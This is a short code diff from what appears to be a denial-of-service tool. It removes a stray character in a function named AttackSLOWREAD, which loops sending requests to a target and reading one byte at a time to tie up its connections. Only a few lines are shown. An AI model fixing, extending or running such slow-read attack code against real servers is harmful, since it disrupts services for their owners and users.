@@ -719,7 +719,7 @@ def AttackSLOWREAD(target, until_datetime, stats, delay, timeout):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             s.send(req.encode())
-            s.recv(1) .
+            s.recv(1) 
             time.sleep(random.uniform(0.5, 2))
             if stats: stats['total'] += 1
         except:
